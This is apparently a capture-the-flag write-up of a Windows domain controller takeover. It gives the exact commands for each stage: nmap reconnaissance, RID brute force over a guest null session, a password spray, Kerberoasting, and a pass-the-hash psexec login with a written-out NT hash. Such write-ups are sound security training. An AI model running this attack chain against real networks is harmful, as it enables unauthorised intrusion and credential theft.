TARGET: Windows Server 2022 DC // STATUS: COMPROMISED // AUTHOR: Operator

0x01_Reconnaissance

The operation began with an nmap scan to identify the attack surface. The target was identified as a Windows Domain Controller running SOUPEDECODE.LOCAL.

nmap -sC -sV 10.49.167.13 -oA nmap/soupedecode_01

0x02_Initial_Foothold

I identified that the guest account was enabled with a blank password. This allowed for an IPC$ null session, which I leveraged for a RID Brute Force attack to harvest valid domain usernames.

nxc smb 10.49.167.13 -u 'guest' -p '' --rid-brute

0x03_Credential_Access

After a failed AS-REP roasting attempt, I executed a password spray (username = password). The account ybob317 was successfully compromised.

nxc smb 10.49.167.13 -u users.txt -p users.txt --no-brute --continue-on-success

0x04_Privilege_Escalation

Using ybob317, I performed Kerberoasting and cracked the password for file_svc. This service account had read access to a backup share containing backup_extract.txt—a goldmine of machine account NT hashes.

impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.49.167.13 -request

0x05_Domain_Takeover

By executing a Pass-the-Hash (PtH) attack using the FileServer$ hash, I gained administrative access to the DC and spawned a SYSTEM shell via psexec.

impacket-psexec SOUPEDECODE.LOCAL/'FileServer$'@10.49.167.13 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
KEY_TAKEAWAY: This attack chain demonstrates how a single misconfiguration (Guest IPC$ access) and a weak service account password can cascade into a full Active Directory compromise without using any exploits.
